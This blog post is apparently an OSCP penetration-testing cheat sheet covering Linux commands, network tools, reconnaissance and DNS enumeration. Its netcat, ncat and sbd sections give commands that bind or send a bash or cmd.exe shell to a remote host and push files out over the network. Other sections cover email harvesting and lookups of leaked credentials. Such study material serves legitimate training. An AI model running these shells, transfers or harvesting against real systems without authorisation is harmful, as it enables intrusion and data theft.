---
layout: post
title:  "Pentesting Summary"
categories: "Windows Linux"
tags:  windows linux pentest 
author: Trelis
---

* content
{:toc}

A summary of all the commands and concepts needed to pass the OSCP exam.




# General commands
## Locate
Before using locate, you should update de database:

```
updatedb
```

Once de database has been built, we can use locate to find a file of which we know the name. The search will be fast due the database has an index of all the local files.

```
locate FILE.EXE
```

## Which
This command searches for a given name through all the folders that are defined in the enviroment variable $PATH:

```
which FILE
```

## Find
Find is able to recursively search any given path for various files. It is more aggressive than locate and which:

```
find / -name FILE
```

For example, if we want to find all files named test:

```
find / -name test*
```

## Netstat
It shows all the services running and listening on a port:

```
netstat -antp | grep SERVICE
```

## Systemctl
In order to start or stop a service, we can use the command systemctl:

```
systemctl start SERVICE
systemctl stop SERVICE
```

If we want to have the service starting automatically  at boot time, we can use the options enable or disable:

```
systemctl enable SERVICE
systemctl disable SERVICE
```

# Essential Tools
## Netcat

```
Connect
nc -nv IP PORT [-e /bin/bash or cmd.exe]

Listen
nc -nlvp PORT [-e /bin/bash or cmd.exe]

* -e redirects the input, output and error messages to the PORT rather than the default console. So it binds the shell to a local port. Anyone who connects to the port will find a command prompt.

Transfer file 
nc -nv IP PORT < FILE.TXT

Receive file
nv -nlvp PORT > FILE.TXT
```

## Ncat
It is a reimplementation of Netcat. It is the same but allows to create encrypted communications:

```
Connect
ncat -v IP PORT -ssl

Listen
ncat --exec cmd.exe --allow IP -vnl PORT --ssl
```

## sbd
sbd is a Netcat-clone, designed to be portable and offer strong encryption:

```
Connect
sbd IP PORT

Listen
sbd -l -p PORT -e [bash/cmd.exe] -v -n
```

## Wireshark
Some Wireshark capture filters:

```
IP Address
ip.addr == 192.168.0.5
!(ip.addr == 192.168.0.0/24)

Protocol
tcp
udp
tcp.port == 80 || udp.port == 80
http
not arp and not (udp.port == 53)
```

For molt filters: https://wiki.wireshark.org/CaptureFilters

## Tcpdump
Some tcpdump flags:

```
Listen to an interface
tcpdump -i INTERFACE

Filter traffic by IP
tcpdump host IP

Filter traffic by source and destination
tcpdump src IP1 dst IP2

Filter traffic by port
tcpdump port PORT
tcpdump src port PORT

Filter traffic by protocol
tcpdump tcp

Save output
tcpdump -w output.pcap

Read pcap
tcpdump -r input.pcap
```

For more information: https://danielmiessler.com/study/tcpdump/


# Passive Information Gathering
## Google Hacking
* [SANS CheatSheet](https://www.sans.org/security-resources/GoogleCheatSheet.pdf)
* [AlienVaultt CheatSheet](https://www.alienvault.com/blog-content/GoogleHackingCheatSheet.pdf)
* [Using Google as a Security Testing Tool - Johnny Long](http://www.mrjoeyjohnson.com/Google.Hacking.Filters.pdf)
* [Google Hacking Database (GHDB)](https://www.exploit-db.com/google-hacking-database/)

## Email Harvesting
Email harvesting is the process of obtaining a large number of email addresses through various methods. The purpose of harvesting email addresses is for revealing the naming convention used in the organization or mapping out users.

One tool that can perform this task is theharvester:

```
theharvester -d DOMAIN_TO_SEARCH -b DATA_SOURCE

For example: Search from email addresses from a domain (-d kali.org), limiting the results to 500 (-l 500), using Google (-b google):
theharvester -d kali.org -l 500 -b google
``` 

For more information: https://tools.kali.org/information-gathering/theharvester

## Netcraft
Netcraft is a monitoring company. It can be used to find out servers information:
* [Netcraft website](https://searchdns.netcraft.com/?host=) 

## Whois
WHOIS is a query and response protocol that is widely used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block or an autonomous system, but is also used for a wider range of other information.

```
whois HOST/IP
```

## Recon-ng
Recon-ng is a reconnaissance tool with an interface similar to Metasploit. Running recon-ng from the command line you enter a shell like environment where you can configure options, perform recon and output results to different report types.

Basic commands:

* **show** available modules.
* **sea­rch** available modules.
* **info** inform­ation on how the module works.
* **show options** options that can be set.
* **set** sets the options.
* **run** to execute.


What can we do:
* Harvest contacts (whois, jigsaw, linkedin, twitte­r)(use the mangle module to extract and present e-mail data)
* Identify hosts
* Identify geogra­phical locati­ons of hosts and indivi­duals using hostop, ipinfodb, maxmind, uniapple, wigle
* Identify host inform­ation using netcraft and related modules
* Identify account and password inform­ation that has previously been compro­mised and leaked onto the Internet (the pwnedlist modules, wascom­pan­yha­cked, xssed, and punksp­ider)

More information:
* [The Recon-ng Framework : Automated Information Gathering](https://resources.infosecinstitute.com/the-recon-ng-framework-automated-information-gathering/)
* [Basic Updated Guide to Recon-ng plus New Modules Rundown](https://resources.infosecinstitute.com/basic-updated-guide-to-recon-ng-plus-new-modules-rundown/)


# Active Information Gathering
## DNS Enumeration
More information about DNS enumeration:
* [How to ghather dns information](https://github.com/nixawk/pentest-wiki/blob/master/1.Information-Gathering/How-to-gather-dns-information.md)

### Basic interaction
You can interact with a DNS using queries. There are lots of types of DNS queries. Here are the main ones:
* Type **“A”** for IPv4 addresses
* Type **“AAAA”** for IPv6 addresses
* Type **“CNAME”** (Canonical Names) – specifies a domain name that has to be queried in order to resolve the original DNS query
* Type **“PTR”** (Pointer) that specified a reverse query (requesting the FQDN – Fully Qualified Domain Name – corresponding to the IP address you provided)
* Type **“NS”** (Name Server) to get information about the authoritative name server
* Type **“SOA”** (Start Of zone Authority): used when transferring zones
* Type **“MX”** (Mail eXchange) to request information about the mail exchange server for a specific DNS domain name

We can use the command host to obtain information about a host:

```
host -t TYPE HOST
```

For more information about the flags of host command:
* [man host](http://www.skrenta.com/rt/man/host.1.html)

For example, we will use the host test.com:

```
Obtaining DNS
root@kali:~# host -t ns test.com
test.com name server ns1.test.com
test.com name server ns2.test.com

Obtaining mail servers
root@kali:~# host -t mx test.com
test.com mail is handled by 60 mail.test.com
test.com mail is handled by 50 mail2.test.com
```

### Forward Lookup Brute Force
It is possible to enumerate subdomains using host. For example:

```
Existing subdomain
root@kali:~# host www.test.com
www.test.com has address 1.2.3.4

Non-existing subdomain
root@kali:~# host idontexist.test.com
Host idontexist.test.com not found: 3(NXDOMAIN)
```

Knowing this we can make a list (subdomains.txt) of possible subdomains and bruteforce them using bash:

```
root@kali:~# for subdomain in $(cat subdomains.txt);do host $subdomain.test.com;done
www.test.com has address 1.2.3.4
Host idontexist.test.com not found: 3(NXDOMAIN)
Host proxy.test.com not found: 3(NXDOMAIN)
ftp.test.com has address 1.2.3.52
mail.test.com has address 1.2.3.15
Host router.test.com not found: 3(NXDOMAIN)
```

### Reverse Lookup Brute Force
In the last example, the brute force attack raveled some IP. If the DNS administrator of test.com has configured PTR records, we can do a brute force attack using IP instead of subdomains.

PTR records are mainly used to check if the server name is actually associated with the IP address from where the connection was initiated.

For example, we make a bash script in order to brute force all the IPs in a range:

```
root@kali:~# for ip in $(seq 15 52); do host 1.2.3.$ip;done | grep -v "not found"
1.2.3.45.in-addr.arpa domain name pointer mail2.test.com
1.2.3.45.in-addr.arpa domain name pointer mail3.test.com
```

### DNS Zone Transfers
DNS zone transfer, also sometimes known by the inducing DNS query type AXFR, is a type of DNS transaction. It is one of the many mechanisms available for administrators to replicate DNS databases across a set of DNS servers.

Zone transfers should be limited to authorized slave DNS servers. If the administrator has not correctly configured the DNS server, it could allow an attacker to obtain a copy of all the information that the DNS server has. In other words, it would obtain all the names and IPs of the servers in the corporate network.

```
host -l HOST DNS
```

For example, zone transfer might fail if the server is correctly configured:
```
root@kali:~# host -l test.com ns1.test.com
; Transfer failed.
Using domain server:
Name: ns1.test.com
Address: IP
Aliases:
Host test.com not found: 5(REFUSED)
; Transfer failed.
```

If it is successful, it would provide all the information about the corporate network under "Aliases".

### DNSRecon
DNSRecon which is a tool that was developed by Carlos Perez and it is designed to perform DNS reconnaissance.
* [Github](https://github.com/darkoperator/dnsrecon)
* [Kali Tools](https://tools.kali.org/information-gathering/dnsrecon)
* [Tutorial](https://pentestlab.blog/2012/11/13/dns-reconnaissance-dnsrecon/)

```
dnsrecon -d HOST -t axfr
```

### DNSenum
Multithreaded perl script to enumerate DNS information of a domain and to discover non-contiguous ip blocks.

* [Githug](https://github.com/fwaeytens/dnsenum)
* [Kali Tools](https://tools.kali.org/information-gathering/dnsenum)
* [Tutorial](https://kalilinuxtutorials.com/dnsenum/)

```
dnsenum HOST
```

